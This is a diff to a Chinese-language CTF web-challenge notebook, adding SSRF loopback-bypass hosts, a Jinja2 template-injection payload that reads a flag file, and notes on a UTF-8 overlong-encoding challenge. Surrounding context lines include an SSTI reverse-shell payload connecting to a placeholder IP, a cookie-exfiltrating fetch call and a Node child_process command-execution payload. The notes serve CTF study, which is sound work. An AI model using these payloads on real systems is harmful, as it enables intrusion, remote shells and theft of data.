@@ -900,7 +900,7 @@ index()
 125. 对于SSRF，127.0.0.1无法使用的情况下，可以考虑0.0.0.0。
 126. [[网鼎杯 2020 玄武组]SSRFMe](https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/)
 - [redis](https://blog.csdn.net/like98k/article/details/106417214) [主从复制](https://www.cnblogs.com/karsa/p/14123957.html) [SSRF](https://xz.aliyun.com/t/5665)（RCE）。主要利用[Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)和[redis-ssrf](https://github.com/xmsec/redis-ssrf)两个工具。
-- 绕过ssrf内网ip检测(php libcurl相关)。
+- 绕过ssrf内网ip检测(php libcurl相关，但部分技巧也可以用在绕php之外的ip WAF里)。
   - 利用0.0.0.0:`http://0.0.0.0/`
   - 利用curl和其他库解析url的差异性(已在curl的较新版本被修复)：`http://foo@127.0.0.1:80@www.google.com/` ，https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
   - `http://127.1/hint.php`:ip2long('127.1')会返回false,不过gethostbyname在linux下会返回127.0.0.1，无法绕过。windows下的gethostbyname倒是会返回127.1，可以绕过
@@ -912,6 +912,9 @@ index()
     http://[::]/  >>>  http://0.0.0.0/
     ```
   - `http:///127.0.0.1/`:并不是只有浏览器才会解析这样host为空的畸形url，curl和git也会按照浏览器的方式解析。单纯curl不行，但是php的lib curl行。parse_url解析这样的畸形url会返回false，`$hostname=$url_parse['host'];`会返回null。最后，windows下`gethostbyname(null);`会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，gethostbyname会返回null，绕过ip检测
+  - `http://localtest.me`
+  - `localh.st`
+  - `127.0.0.4`,`http://127.0.0.2`，好像127开头的都是loopback地址
 127. [[NPUCTF2020]验证🐎](https://blog.csdn.net/hiahiachang/article/details/105756697)。本题的知识点有：
 - js中列表，对象等与字符串相加会导致强制类型转换，结果为字符串。可用这个特点绕过一些md5加盐。以及，绕过md5时如果程序启用了json，可以利用json构造对象绕过大部分限制。
 - js利用__proto__可从原型链上引出Function和String，Function用于构造函数，String用于得到fromCharCode绕过强制过滤。利用`process.mainModule.require('child_process').execSync('cat /flag')`进行rce，同时还利用了箭头函数。
@@ -2566,6 +2569,7 @@ js.fetch("url" + js.document.cookie)
     - `{{ ''.__class__.__base__.__subclasses__()[352](["python", "-c", "import socket,os,pty;s=socket.socket();s.connect(('ip',port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"]) }}`:反弹shell
     - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{% endfor %}`:无需另外爆破索引
     - `{{''.__class__.__mro__[1].__subclasses__()[352]("cat /flag*", shell=True, stdout=-1).communicate()}}`
+    - `{{ request.__class__._load_form_data.__globals__.__builtins__.open("flag.txt").read() }}`
 - python与SMTP服务器进行交互。
     ```py
     import smtplib
@@ -3631,3 +3635,6 @@ for _, bi := range ba {
   - `/sys.scripts.modern.do`的`Scripts - Background`处可执行server side js代码。可用于测试一些poc
   - 查找用户/系统id
 - ServiceNow server side js原型链污染。ServiceNow内部执行server side js代码时用的是Rhino引擎。其中`__proto__`很早以前就被弃用了，原型链污染这个键不会起作用。可污染`constructor.prototype`代替
+451. [utf-wait](https://github.com/acmucsd/sdctf-2024/tree/main/web/utf-wait)
+- [UTF-8 Overlong Encoding](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)。这道题考的倒不是Overlong Encoding相关的漏洞，而是猜测flag这四个字符在服务器上对应的Overlong Encoding（见Overlong Encoding的介绍，一个字符有多种Overlong Encoding的方式）
+- 这个[脚本](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#utf-wait)可能好理解一点
